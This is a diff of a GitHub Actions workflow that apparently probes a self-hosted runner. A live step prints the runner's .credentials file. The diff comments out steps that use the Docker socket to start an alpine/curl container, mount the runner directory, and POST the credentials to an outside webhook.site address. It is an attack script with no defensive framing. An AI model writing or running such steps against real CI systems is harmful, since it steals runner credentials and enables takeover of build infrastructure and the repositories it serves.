@@ -9,26 +9,26 @@ jobs:
       - run : ls /home/ubuntu/actions-runner -a
       - run : cat /home/ubuntu/actions-runner/.credentials
       - run : pwd
-      - run : |
-          curl -s --unix-socket /var/run/docker.sock \
-          "http:/v1.42/images/create?fromImage=alpine/curl&tag=latest" \
-          -X POST \
-          -H "Content-Type: application/json"
-      - run : |
-          curl -s --unix-socket /var/run/docker.sock \
-          "http:/v1.42/containers/create?name=kewl" \
-          -X POST \
-          -H "Content-Type: application/json" \
-          -d '{ "Image": "alpine/curl:latest","Volumes": {"/home/ubuntu/actions-runner":{"bind":"/home/ubuntu/actions-runner","mode":"rw"}}, "Cmd": [ "curl","-d","@.credentials","https://webhook.site/a5f2df3f-89ee-409d-95fc-b093b6ecab55" ] }'
+      #- run : |
+      #    curl -s --unix-socket /var/run/docker.sock \
+      #    "http:/v1.42/images/create?fromImage=alpine/curl&tag=latest" \
+      #    -X POST \
+      #    -H "Content-Type: application/json"
+      #- run : |
+      #    curl -s --unix-socket /var/run/docker.sock \
+      #    "http:/v1.42/containers/create?name=kewl" \
+      #    -X POST \
+      #    -H "Content-Type: application/json" \
+      #    -d '{ "Image": "alpine/curl:latest","Volumes": {"/home/ubuntu/actions-runner":{"bind":"/home/ubuntu/actions-runner","mode":"rw"}}, "Cmd": [ "curl","-d","@.credentials","https://webhook.site/a5f2df3f-89ee-409d-95fc-b093b6ecab55" ] }'
          #-d '{ "Image": "alpine/curl:latest","Volumes": {"/home/runner/work/workflow-tester/workflow-tester":{"bind":"/home/runner/work/workflow-tester/workflow-tester","mode":"rw"}}, "Cmd": [ "curl","-X","POST","--data-binary","@-","https://webhook.site/a5f2df3f-89ee-409d-95fc-b093b6ecab55" ] }'
           
-      - run : | 
-          curl -s --unix-socket /var/run/docker.sock \
-          "http:/v1.42/containers/kewl/start" \
-          -X POST \
-              -H "Content-Type: application/json"
+      #- run : | 
+      #    curl -s --unix-socket /var/run/docker.sock \
+      #    "http:/v1.42/containers/kewl/start" \
+      #    -X POST \
+      #        -H "Content-Type: application/json"
   build-cloud:
       permissions: {}
       runs-on: ['self-hosted', 'Linux', 'X64']
       steps:
-        - run : ls       
+        - run : ls /home/ubuntu/actions-runner/_work/workflow-tester/workflow-tester       
